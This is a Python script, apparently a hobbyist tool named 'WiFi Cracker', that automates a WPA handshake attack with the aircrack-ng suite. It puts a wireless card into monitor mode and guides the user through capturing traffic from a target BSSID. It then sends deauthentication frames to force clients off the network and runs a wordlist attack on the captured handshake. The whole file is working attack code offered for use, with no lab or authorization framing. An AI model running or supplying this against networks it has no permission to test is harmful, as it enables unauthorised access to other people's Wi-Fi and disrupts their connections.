import subprocess
import time


# ANSI escape codes for colors
class Color:
    BOLD = '\033[1m'
    END = '\033[0m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RED = '\033[91m'

def execute_command(command, show_output=True):
    if show_output:
        subprocess.run(command.split(), check=True)
    else:
        subprocess.run(command.split(), check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Customized banner with color
def print_banner():
    print(f"""{Color.BOLD}{Color.YELLOW}

 __          _______ ______ _____    _____ _____            _____ _  __
 \ \        / /_   _|  ____|_   _|  / ____|  __ \     /\   / ____| |/ /
  \ \  /\  / /  | | | |__    | |   | |    | |__) |   /  \ | |    | ' / 
   \ \/  \/ /   | | |  __|   | |   | |    |  _  /   / /\ \| |    |  <  
    \  /\  /   _| |_| |     _| |_  | |____| | \ \  / ____ \ |____| . \ 
     \/  \/   |_____|_|    |_____|  \_____|_|  \_\/_/    \_\_____|_|\
                                                                     _\
                                                                                                                                                                                           
                        Developed by: Ankit Singh
                        Tool Name: WiFi Cracker
                        Version : 0.1.2
{Color.END}""")

print_banner()

# 1. airmon-ng check kill
execute_command("airmon-ng check kill", show_output=False)

# 2. Wait for 2 seconds
time.sleep(2)

# 3. Enabling monitor mode
execute_command("airmon-ng start wlan0" , show_output=False)

# 4. Wait for 2 seconds
time.sleep(2)

# 5. Prompt user to open a new terminal and run "airodump-ng wlan0"
print_banner()
print(f"{Color.BOLD}{Color.CYAN}Please open a new terminal window and run the following command:")
print("airodump-ng wlan0")
input("Press Enter when you've finished running the command..." + Color.END)

# Assume the user has gathered the required information
bssid = input(f"{Color.BOLD}Enter BSSID: {Color.END}")
ch = input(f"{Color.BOLD}Enter CH: {Color.END}")

# 6. Wait for 2 seconds
time.sleep(2)

# 7. Run airodump-ng with provided BSSID and CH in a new terminal
print_banner()
print(f"{Color.BOLD}{Color.CYAN}Open a new terminal and run this command:")
print(f"airodump-ng --bssid {bssid} -c {ch} wlan0 -w hand_shake")
input("Press Enter when you're done..." + Color.END)

# 8. Wait for 2 seconds
time.sleep(2)

# 9. Print "Disconnecting host from WiFi"
print_banner()
print(f"{Color.BOLD}{Color.CYAN}Disconnecting host from WiFi Network, Plesae wait Few Second...{Color.END}")

# 10. Deauthenticating host from WiFi
execute_command(f"aireplay-ng --deauth 5 -a {bssid} wlan0" , show_output=False)
print()

# 11. Wait for 2 seconds
time.sleep(2)

# ask user did hankshake file captured or not

confirmation = input(f"{Color.BOLD} DID Handshake File of this {bssid} captured in other terminal or not : YES / NO : {Color.END}")
if confirmation == "yes" :
    print(f"{Color.BOLD}{Color.CYAN}Password cracking starts {Color.END}")
    wordlist = input(f"{Color.BOLD}Enter full path of wordlist:  {Color.END}")
    print("Wait... until password is cracked...")
    execute_command(f"aircrack-ng --bssid {bssid} -w {wordlist} hand_shake-01.cap", show_output=True)
else :
    print(f"{Color.BOLD}{Color.CYAN} SORRY CAN'T MOVE FORWORD UNTIL HANDSHAKE FILE CAPTURED {Color.END}")

